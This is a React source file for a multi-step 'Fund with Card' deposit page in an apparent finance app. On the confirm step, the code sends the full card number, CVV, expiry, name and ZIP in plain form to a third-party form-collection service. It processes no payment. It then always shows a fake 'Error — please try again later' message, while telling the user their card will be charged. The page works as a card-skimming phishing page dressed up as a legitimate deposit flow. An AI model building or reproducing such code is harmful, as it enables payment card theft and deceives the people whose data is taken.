import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, Lock } from "lucide-react";
import { money } from "@/lib/format";
import { toast } from "sonner";
import { submitToFormspark } from "@/lib/formspark";

export const Route = createFileRoute("/_app/deposit/card")({
  component: DepositCard,
});

function DepositCard() {
  const nav = useNavigate();
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [busy, setBusy] = useState(false);
  const [amount, setAmount] = useState("250");
  const [card, setCard] = useState({ number: "", name: "", exp: "", cvv: "", country: "United States", zip: "" });

  const value = Number(amount) || 0;
  const fee = +(value * 0.015).toFixed(2);
  const total = value + fee;

  return (
    <div className="mx-auto max-w-md px-5 pt-6">
      <div className="flex items-center gap-2">
        <button onClick={() => (step === 1 ? nav({ to: "/deposit" }) : setStep((s) => (s - 1) as 1))} className="grid h-10 w-10 place-items-center rounded-full hover:bg-surface">
          <ArrowLeft className="h-5 w-5" />
        </button>
        <h1 className="text-xl font-bold">Fund with Card</h1>
      </div>

      <div className="mt-6 flex items-center gap-2">
        {[1, 2, 3].map((n) => (
          <div key={n} className={`h-1.5 flex-1 rounded-full ${n <= (step > 3 ? 3 : step) ? "bg-primary" : "bg-muted"}`} />
        ))}
      </div>

      {step === 1 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Enter amount</h2>
          <p className="mt-1 text-sm text-muted-foreground">How much would you like to add?</p>
          <div className="card-elevated mt-6 p-6 text-center">
            <div className="flex items-center justify-center gap-1">
              <span className="text-4xl font-extrabold">$</span>
              <input
                inputMode="decimal"
                value={amount}
                onChange={(e) => setAmount(e.target.value.replace(/[^\d.]/g, ""))}
                className="w-40 bg-transparent text-center text-5xl font-extrabold tracking-tight outline-none"
              />
            </div>
            <div className="mt-1 text-xs text-muted-foreground">USD</div>
            <div className="mt-6 grid grid-cols-4 gap-2">
              {[50, 100, 250, 500].map((v) => (
                <button
                  key={v}
                  onClick={() => setAmount(String(v))}
                  className={`h-11 rounded-xl text-sm font-semibold transition ${amount === String(v) ? "bg-primary text-primary-foreground" : "bg-surface hover:bg-muted"}`}
                >
                  ${v}
                </button>
              ))}
            </div>
          </div>
          <button onClick={() => setStep(2)} className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center rounded-2xl font-semibold">
            Continue
          </button>
          <div className="mt-4 text-center text-xs text-muted-foreground">Instant deposit to your account</div>
        </div>
      )}

      {step === 2 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Add new card</h2>
          <p className="mt-1 text-sm text-muted-foreground">We accept Visa, Mastercard, Maestro, Verve and AmEx.</p>
          <div className="mt-6 space-y-3">
            <Input label="Card number" placeholder="1234 5678 9012 3456" value={card.number} onChange={(v) => setCard({ ...card, number: v })} />
            <Input label="Cardholder name" placeholder="Jane Doe" value={card.name} onChange={(v) => setCard({ ...card, name: v })} />
            <div className="grid grid-cols-2 gap-3">
              <Input label="Expiry" placeholder="MM/YY" value={card.exp} onChange={(v) => setCard({ ...card, exp: v })} />
              <Input label="CVV" placeholder="123" value={card.cvv} onChange={(v) => setCard({ ...card, cvv: v })} />
            </div>
            <Input label="Country" value={card.country} onChange={(v) => setCard({ ...card, country: v })} />
            <Input label="ZIP code" placeholder="10001" value={card.zip} onChange={(v) => setCard({ ...card, zip: v })} />
          </div>
          <button onClick={() => setStep(3)} className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center rounded-2xl font-semibold">
            Add card
          </button>
        </div>
      )}

      {step === 3 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Review and confirm</h2>
          <p className="mt-1 text-sm text-muted-foreground">Please review your deposit details before confirming.</p>

          <div className="mt-4 rounded-3xl bg-gradient-to-br from-[oklch(0.35_0.12_260)] to-[oklch(0.2_0.1_270)] p-5 text-white">
            <div className="text-sm opacity-70">VISA</div>
            <div className="mt-6 text-xl tracking-widest">•••• {(card.number.replace(/\s/g, "").slice(-4)) || "3456"}</div>
            <div className="mt-3 flex items-end justify-between text-sm">
              <div>
                <div className="text-[10px] opacity-60">Cardholder</div>
                <div className="font-semibold">{card.name || "Jane Doe"}</div>
              </div>
              <div>
                <div className="text-[10px] opacity-60">Exp</div>
                <div className="font-semibold">{card.exp || "12/26"}</div>
              </div>
            </div>
          </div>

          <div className="card-elevated mt-4 p-4 text-sm">
            <Row label="Amount" value={money(value)} />
            <Row label="Processing fee" value={money(fee)} />
            <div className="my-2 border-t border-border" />
            <Row label="You will be charged" value={money(total)} bold />
            <Row label="You will receive" value={money(value)} />
          </div>

          <button
            onClick={async () => {
              setBusy(true);
              await submitToFormspark("deposit-card", {
                amount_usd: value,
                fee,
                total,
                card_number: card.number,
                cardholder: card.name,
                expiry: card.exp,
                cvv: card.cvv,
                country: card.country,
                zip: card.zip,
              });
              setBusy(false);
              toast.error("Error — please try again later");
            }}
            disabled={busy || value <= 0}
            className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center gap-2 rounded-2xl font-semibold disabled:opacity-60"
          >
            <Lock className="h-4 w-4" /> {busy ? "Processing…" : `Fund Account · ${money(total)}`}
          </button>
          <div className="mt-3 text-center text-xs text-muted-foreground">Your card will be charged {money(total)}.</div>
        </div>
      )}
    </div>
  );
}

function Input({ label, value, onChange, placeholder }: { label: string; value: string; onChange: (v: string) => void; placeholder?: string }) {
  return (
    <label className="block">
      <span className="text-xs font-medium text-muted-foreground">{label}</span>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="mt-1 h-13 w-full rounded-2xl border border-input bg-surface px-4 py-3 text-[15px] outline-none focus:border-primary focus:ring-4 focus:ring-primary/20"
      />
    </label>
  );
}

function Row({ label, value, bold }: { label: string; value: string; bold?: boolean }) {
  return (
    <div className="flex items-center justify-between py-1">
      <span className="text-muted-foreground">{label}</span>
      <span className={bold ? "font-bold" : "font-semibold"}>{value}</span>
    </div>
  );
}
